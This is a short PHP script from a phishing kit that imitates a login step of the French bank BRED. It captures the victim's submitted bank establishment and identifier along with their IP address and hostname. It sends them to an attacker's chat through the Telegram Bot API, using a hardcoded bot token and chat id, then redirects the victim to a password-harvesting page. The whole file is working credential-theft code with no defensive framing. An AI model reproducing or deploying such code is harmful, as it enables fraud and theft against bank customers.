<?php
ob_start();
session_start();
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
if(!empty($_POST['etab'])){
$message  = "[+]━━━━【🏦 BRED / Login 】━━━[+]\n";
$message .= "🏦 Etablissement Bancaire  : ".$_POST['etab']."\n";
$message .= "[🆔 Identifiant]: " . $_POST['ide']. "\n";
$message .= "\n";
$message .= "[🔍 IP INFO] : http://www.geoiptool.com/?IP=$ip\n";
$message .= "==========[ Bred  INFO]=========";
$token = "8942970138:AAGWB2jmCozyKCo1PZX18paXoBFXRPumdm4";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=8933881160&text=" . urlencode($message)."" );
header("Location:./mot-de-passe.php");
}else{
header("Location:./mot-de-passe.php");
}

?>